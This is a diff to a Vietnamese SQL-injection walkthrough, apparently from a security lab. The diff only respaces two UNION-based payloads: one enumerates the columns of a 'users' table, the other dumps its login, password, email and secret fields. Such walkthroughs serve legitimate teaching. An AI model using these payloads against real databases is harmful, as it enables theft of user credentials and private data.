@@ -53,13 +53,13 @@ SELECT * FROM <table of database> WHERE Title LIKE '<title>';
 
 3. Xác định tên cột trong bảng `users`:
 - Thực hiện tìm kiếm với thông tin:<br>
-```' and 1=0 UNION SELECT 1,table_name, column_name,4,5,6,7 FROM information_schema.columns WHERE table_name='users'#```
+```' and 1=0 UNION SELECT 1,table_name,column_name,4,5,6,7 FROM information_schema.columns WHERE table_name='users'#```
 
 ![alt text](images/62.png)
 
 4. Tìm kiếm các thông tin nhạy cảm:
 - Thực hiện tìm kiếm với thông tin:<br>
-```' and 1=0 UNION SELECT 1,login, password, email, secret,6,7 FROM users#```
+```' and 1=0 UNION SELECT 1,login,password,email,secret,6,7 FROM users#```
 
 ![alt text](images/64.png)
 
